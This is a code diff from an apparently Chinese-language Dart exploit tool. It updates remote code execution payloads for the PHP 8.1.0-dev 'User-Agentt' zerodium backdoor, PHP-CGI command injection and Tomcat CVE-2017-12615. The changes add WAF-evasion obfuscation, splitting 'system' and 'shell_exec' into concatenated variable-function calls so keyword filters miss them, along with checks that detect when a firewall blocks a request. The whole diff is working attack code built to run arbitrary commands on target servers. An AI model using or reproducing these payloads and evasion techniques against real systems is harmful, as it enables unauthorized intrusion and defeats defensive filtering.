@@ -6,6 +6,7 @@ import '../../../core/http/http_result.dart';
 
 import 'exp_result.dart';
 import 'rce_encoder.dart';
+import 'waf_detect.dart';
 
 class PhpBackdoorExpService {
   final String baseUrl;
@@ -29,10 +30,19 @@ class PhpBackdoorExpService {
 
   Future<ExpResult> check() async {
     try {
+      // 关键词规避：不出现 system( 字面量（WAF 常见规则）。
       final res = await _httpClient.getOrThrow(
         '$_base$phpPath',
-        headers: {'User-Agentt': 'zerodiumsystem("echo PHP_BACKDOOR_54289");'},
+        headers: {
+          'User-Agentt': r"zerodium$f='sys'.'tem';$f('echo PHP_BACKDOOR_54289');",
+        },
       );
+      if (looksLikeWafBlock(res.statusCode, res.body)) {
+        return ExpResult.probeFailed(
+          'PHP 8.1.0-dev 后门',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
       if ((res.body ?? '').contains('PHP_BACKDOOR_54289')) {
         return ExpResult(true, 'PHP 8.1.0-dev 后门', 'User-Agentt 后门存在，回显验证通过');
       }
@@ -61,12 +71,20 @@ class PhpBackdoorExpService {
       final res = await _httpClient.getOrThrow(
         '$_base$phpPath',
         headers: {
+          // 变量函数规避 `system(` 关键词；PHP 单引号避免 $var 插值。
           'User-Agentt':
-              "zerodiumecho '${_sentinel}_S';system('$escaped');echo '${_sentinel}_E';",
+              "zerodiumecho '${_sentinel}_S';"
+              "\$f='sys'.'tem';"
+              "\$f('$escaped');"
+              "echo '${_sentinel}_E';",
         },
       );
       final body = res.body ?? '';
       if (body.isEmpty) return null;
+      if (looksLikeWafBlock(res.statusCode, body) ||
+          looksLikeBlockedBody(body)) {
+        return '[Blocked] 命令未执行：疑似被 WAF 拦截 (HTTP ${res.statusCode})';
+      }
       return _extract(body) ?? body;
     } catch (_) {
       return null;
@@ -126,7 +144,12 @@ class PhpCgiExpService {
       final res = await _httpClient.postOrThrow(
         url,
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: "<?php echo '$begin'; echo shell_exec('$escaped'); echo '$end'; ?>",
+        // 变量函数规避 shell_exec( 关键词；语义不变。
+        body:
+            "<?php echo '$begin'; "
+            "\$f='shell'.'_exec'; "
+            "echo \$f('$escaped'); "
+            "echo '$end'; ?>",
       );
       final body = res.body ?? '';
       final s = body.indexOf(begin);
@@ -173,6 +196,12 @@ class TomcatExpService {
         body: probeJsp,
       );
       // PUT 没有 orThrow 包装：网络层失败时必须显式区分，否则会落到"未发现"。
+      if (looksLikeWafBlock(putJspRes.statusCode, putJspRes.body)) {
+        return ExpResult.probeFailed(
+          'CVE-2017-12615',
+          '疑似被 WAF 拦截 (HTTP ${putJspRes.statusCode})',
+        );
+      }
       if (!putJspRes.isOk) {
         return ExpResult.probeFailed(
           'CVE-2017-12615',
